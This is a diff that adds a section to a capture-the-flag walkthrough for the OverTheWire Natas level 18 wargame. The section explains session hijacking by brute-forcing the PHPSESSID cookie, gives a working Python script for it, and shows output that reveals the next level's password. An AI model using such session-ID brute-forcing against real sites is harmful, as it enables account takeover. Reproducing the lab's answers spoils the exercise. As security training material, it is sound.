@@ -1034,9 +1034,64 @@ Password: <input name="password"><br>
 <?php } ?>
 ```
 
-From the code, it should be abundantly clear that you need to somehow login as the session id of the admin to gain access to the password. However, there is no way of setting `$_SESSION["admin"]` as 1.
-Thus, the only option is to  
+From the code, it should be abundantly clear that you need to somehow login as the session ID of the admin to gain access to the password. However, there is no way of setting `$_SESSION["admin"]` as 1.
 
+Each session is governed by a variable called "PHPSESSID" and you can see it is actually stored as a cookie via this line, `array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])`. Given this, we can do something known as session hijacking by brute-force logging in as all possible session IDs by changing the value of the "PHPSESSID" cookie. Again, the easiest way is to write a Python script.
+
+```python
+import requests
+
+target = "http://natas18.natas.labs.overthewire.org/"
+auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
+params = {'username': 'abc', 'password': '123'}
+cookies = {}
+
+maxid = 640
+
+for i in range(maxid):
+    print(f"PHPSESSID: {i}")
+    cookies["PHPSESSID"] = str(i)
+    r = requests.get(target, auth=auth, params=params, cookies=cookies)
+    if "You are an admin" in r.text:
+        print(r.text)
+        break
+    else:
+        print("Failed")
+```
+
+From the source code, we know that the maximum ID is 640 so a brute-force attack is a viable approach. Note that the parameters, username and password, are not important at all because the site is checking your session ID in order to verify if you are the admin or not.
+
+Output:
+```
+PHPSESSID: 0
+Failed
+PHPSESSID: 1
+Failed
+PHPSESSID: 2
+Failed
+...
+PHPSESSID: 119
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas18", "pass": "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ" };</script></head>
+<body>
+<h1>natas18</h1>
+<div id="content">
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
 
 ---
 
